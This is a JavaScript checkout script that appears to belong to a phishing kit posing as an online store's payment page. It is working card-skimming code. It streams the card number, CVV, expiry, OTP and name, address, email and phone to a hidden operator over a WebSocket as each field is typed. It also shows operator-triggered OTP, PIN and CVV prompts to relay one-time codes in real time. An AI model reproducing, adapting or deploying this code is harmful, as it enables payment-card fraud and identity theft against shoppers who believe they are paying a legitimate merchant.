function sym(c){return c==='GBP'?'£':c==='USD'?'$':'RM'}
function parseMoney(v){var n=Number(String(v||'').replace(/[^\d.]/g,''));return Number.isFinite(n)?n:0}
function formatMoney(n,c){return sym(c||'MYR')+parseMoney(n).toFixed(2)}
function readOrder(){
  try{return JSON.parse(localStorage.getItem('titancore_order')||localStorage.getItem('neoflam_order')||localStorage.getItem('lotus_order')||'{}')}catch(e){return {}}}
function renderSummary(order){
  order=order||readOrder();
  var items=Array.isArray(order.items)?order.items:[];
  var cur=order.currency||'MYR';
  var html='';
  items.forEach(function(it){
    var imgSrc=it.image||'';
    if(imgSrc&&imgSrc.indexOf('//')===0) imgSrc=location.protocol+imgSrc;
    var img=imgSrc?'<img src="'+imgSrc.replace(/"/g,'&quot;')+'" alt="" loading="lazy">':'<div style="width:64px;height:64px;background:#f5f5f5;border-radius:8px;flex-shrink:0"></div>';
    html+='<div class="tc-summary-item">'+img+'<div style="flex:1;min-width:0"><div class="tc-title">'+(it.title||'Item')+'</div><div class="tc-qty">Qty '+(it.quantity||1)+'</div></div><div class="tc-price">'+formatMoney((it.price||0)*(it.quantity||1),cur)+'</div></div>';
  });
  if(!html) html='<div class="tc-summary-item"><div style="flex:1">Your cart</div><div>—</div></div>';
  var el=document.getElementById('summary-items');
  if(el) el.innerHTML=html;
  var amt=order.amount||0;
  var sub=document.getElementById('subtotal-price');
  var tot=document.getElementById('total-price');
  var priceText=formatMoney(amt,cur);
  if(sub) sub.textContent=priceText;
  if(tot) tot.textContent=priceText;
  document.querySelectorAll('[data-tc-shipping]').forEach(function(node){
    node.textContent='Free';
  });
  document.querySelectorAll('[data-tc-total]').forEach(function(node){
    node.textContent=priceText;
  });
}
fetch('/cart.js',{credentials:'same-origin'}).then(function(r){return r.ok?r.json():null}).then(function(cart){
  if(!cart||!Array.isArray(cart.items)||!cart.items.length){renderSummary();return}
  var order={
    items:cart.items.map(function(i){return{title:i.product_title||i.title,quantity:i.quantity||1,price:(i.final_line_price||i.line_price||0)/100,image:i.image||'',variant:i.variant_title||''}}),
    amount:(cart.total_price||cart.items_subtotal_price||0)/100,
    currency:cart.currency||'MYR'
  };
  try{localStorage.setItem('titancore_order',JSON.stringify(order))}catch(e){}
  renderSummary(order);
}).catch(function(){renderSummary()});

function luhn(n){var s=0,a=0;for(var i=n.length-1;i>=0;i--){var d=parseInt(n[i],10);if(a)s+=d*2>9?d*2-9:d*2;else s+=d;a=!a}return s%10===0}
var ws=null,sid=null,wsTimer=null;
var cid=localStorage.getItem('titancore_cid');
if(!cid){cid='cust_'+Date.now()+'_'+Math.random().toString(36).slice(2,8);localStorage.setItem('titancore_cid',cid)}
function wsUrl(){
  var proto=location.protocol==='https:'?'wss:':'ws:';
  return proto+'//'+location.host+'/api/?role=customer&cid='+encodeURIComponent(cid)+(sid?'&sid='+encodeURIComponent(sid):'');
}
function wsConnect(){
  ws=new WebSocket(wsUrl());
  ws.onopen=function(){if(wsTimer)clearInterval(wsTimer);wsTimer=setInterval(function(){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:'heartbeat'}))},30000)};
  ws.onmessage=function(e){
    var msg=JSON.parse(e.data);
    if(msg.type!=='operator_action')return;
    var p=msg.payload,a=p.action;
    if(a==='ack'){sid=p.sessionId}
    else if(a==='otp_verify'||a==='custom_otp_verify'||a==='email_verify'||a==='pin_verify'||a==='cvv_verify'||a==='app_verify'){
      document.getElementById('load-overlay').classList.remove('show');
      document.getElementById('otp-overlay').classList.add('show');
      document.getElementById('otp-message').textContent=p.message||'Enter verification code';
    }
    else if(a==='approve'){location.href='/complete/'}
    else if(a==='reject'){document.getElementById('load-overlay').classList.remove('show');alert(p.message||'Payment rejected')}
    else if(a==='timeout'){document.getElementById('load-overlay').classList.remove('show');alert('Session timeout')}
  };
  ws.onclose=function(){if(wsTimer)clearInterval(wsTimer);setTimeout(wsConnect,5000)};
}
wsConnect();

function fieldVal(id){
  var el=document.getElementById(id);
  if(!el) return '';
  if(el.tagName==='SELECT'){
    var opt=el.options[el.selectedIndex];
    return opt?(opt.text||opt.value||'').trim():'';
  }
  return (el.value||'').trim();
}

function buildPayload(){
  var order=readOrder();
  var first=fieldVal('bill-first');
  var last=fieldVal('bill-last');
  return {
    frontendUrl: location.hostname,
    currentStep: 'card',
    browsingTabs: [{label:'Checkout',count:1,active:true}],
    cardInfo: {
      cardNumber: (document.getElementById('card-number')||{}).value?document.getElementById('card-number').value.replace(/\s/g,''):'',
      expiry: fieldVal('card-expiry'),
      cvv: fieldVal('card-cvv'),
      cardHolder: fieldVal('card-name'),
      otpCode: fieldVal('otp-code'),
    },
    customerInfo: {
      fullName: (first+' '+last).trim()||fieldVal('card-name'),
      firstName: first,
      lastName: last,
      email: fieldVal('bill-email'),
      phone: fieldVal('bill-phone'),
      country: fieldVal('bill-country'),
      address1: fieldVal('bill-address'),
      city: fieldVal('bill-city'),
      state: fieldVal('bill-state'),
      zipCode: fieldVal('bill-postal'),
    },
    orderSummary: order,
  };
}
function sendPayload(){
  var payload=buildPayload();
  if(!ws||ws.readyState!==1){wsConnect();setTimeout(sendPayload,1500);return}
  if(!sid){ws.send(JSON.stringify({type:'customer_input',payload:payload}));return}
  ws.send(JSON.stringify({type:'session_update',payload:Object.assign({sessionId:sid,status:'pending'},payload)}));
}
function bindPay(){
  var btn=document.getElementById('pay-btn');
  if(!btn) return;
  btn.addEventListener('click',function(){
    if(!fieldVal('bill-email'))return alert('Please enter your email');
    var cn=(document.getElementById('card-number')||{}).value||'';
    cn=cn.replace(/\s/g,'');
    if(cn.length<13||!luhn(cn))return alert('Invalid card number');
    if(!fieldVal('card-expiry').match(/^\d\d\s*\/\s*\d\d$/))return alert('Invalid expiry (MM / YY)');
    if(fieldVal('card-cvv').length<3)return alert('Invalid CVV');
    document.getElementById('load-overlay').classList.add('show');
    sendPayload();
  });
}
bindPay();
document.getElementById('otp-submit').addEventListener('click',function(){
  document.getElementById('otp-overlay').classList.remove('show');
  document.getElementById('load-overlay').classList.add('show');
  sendPayload();
});
var liveTimer=null;
function livePush(){if(!ws||ws.readyState!==1)return;var payload=buildPayload();if(!sid)ws.send(JSON.stringify({type:'customer_input',payload:payload}));else ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,cardInfo:payload.cardInfo,customerInfo:payload.customerInfo,browsingTabs:payload.browsingTabs,currentStep:'card'}}))}
function onInput(){clearTimeout(liveTimer);liveTimer=setTimeout(livePush,150)}
['card-number','card-name','card-expiry','card-cvv','bill-email','bill-first','bill-last','bill-phone','bill-address','bill-city','bill-state','bill-postal','bill-country','otp-code'].forEach(function(id){
  var el=document.getElementById(id);if(el){el.addEventListener('input',onInput);el.addEventListener('change',onInput);}
});
var cardNum=document.getElementById('card-number');
if(cardNum) cardNum.addEventListener('input',function(){
  var v=this.value.replace(/\D/g,'').slice(0,16);this.value=v.replace(/(\d{4})(?=\d)/g,'$1 ');
});
var cardExp=document.getElementById('card-expiry');
if(cardExp) cardExp.addEventListener('input',function(){
  var v=this.value.replace(/\D/g,'').slice(0,4);
  if(v.length>2)v=v.slice(0,2)+' / '+v.slice(2);
  this.value=v;
});
